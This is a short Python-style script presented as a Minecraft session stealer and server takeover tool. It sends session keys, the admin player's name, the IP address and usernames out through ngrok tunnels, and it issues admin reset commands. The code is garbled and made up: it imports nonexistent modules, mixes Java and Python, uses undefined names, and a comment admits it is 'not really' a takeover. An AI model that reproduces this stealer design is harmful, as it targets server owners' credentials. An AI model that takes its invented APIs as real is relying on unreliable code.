import ngrok
import jar, java
import os
import minecraftutils

from ngrok import tunnel
from ngrok import server
from ngrok import interface

from minecraftutils import mc

from java import jar
from java import lwjgl
from lwjgl import *

output_jar_file = minecraftutils.calculateSession(jar.sessionTime(0), jar.sessionID(null), jar.Namespace("serverspeak"), extension=jar)
add_to_category = java.log(java.importLog(ngrok.createNewConnection(ttl=30), dataRate=300))
ip_address = mc.server(mc.serverSession(mc.obtainIPAddress()), ttl=1)

def session(java, ngrok, minecraftutils):
    minecraftutils.calculateUpdate(session.Update(updateTime=5))
    java.surface(minecraftutils.Scan(mc.validSessionKey()))

    if mc.sessionKey == null:

        mc.consoleOutput("An invalid session was detected. Shutting down...")
        serverspeak.core.EndSession()
    else:
        java.surface(mc.sessionKey(java.log(log=add_to_category)))

        ngrok.createNewTunnel(hostname="Logging server")
        ngrok.tunnelInformation(hostname="Logging server", internal_username=f"{mc.administratorServerPlayerName()}", password=null)
        ngrok.tunnelInformation(target_ip_address = f'{ip_address}')

        ngrok.send(send.InformationPackage(information = output_jar_file))
        ngrok.send(send.InformationPackage(information = mc.Detect(mc.server(mc.validSessionKey))))

        ngrok.wrapper.Send(send.InformationPackage(information = mc.validSessionKey(server)))
        ngrok.wrapper.Send(send.InformationPackage(information = java.surface(session.key.Send()), internal_session = True), java.sessionWrapper())

        java.sessionWrapper(information = f"{name}, {userID}, {mc.usernameLog}")
#taking over your server (but not really LMAO)
def takeover(mc, java, ngrok):
    mc.server(detectSession())

    mc.replay(replayCommand(mc.server(sync)), ttl=6700)
    mc.replay(replayCommand(mc.server(syncTime = 0)), internal_session=True)

    mc.replay(sendReplayCommand(mc.server(mc.self(administrator)), command = "/ss reset system internal"))

    mc.server(detectClient())

    if mc.server(Client) == mc.server(unknownClient):
        print("Oops! Your MC server client is not supported. Please try again on a different client.")
        mc.server(executeCommand(internal), command = "/say Oops! Your MC server client is not supported. Please try again on a different client.")

    else:
        mc.server.Start(startClientSession(session_id = java.sessionWrapper.ID))
        ngrok.wrapper.Send(send.InformationPackage(information = session_id))

async def datapackage(ngrok, self):

    session_information = java.sessionWrapper(jar.grab.All())

    ngrok.wrapper.prepare(java.sessionWrapper())
    ngrok.wrapper.prepare(java.surface(session_information))

    ngrok.send(send.InformationPackage(information = session_information()))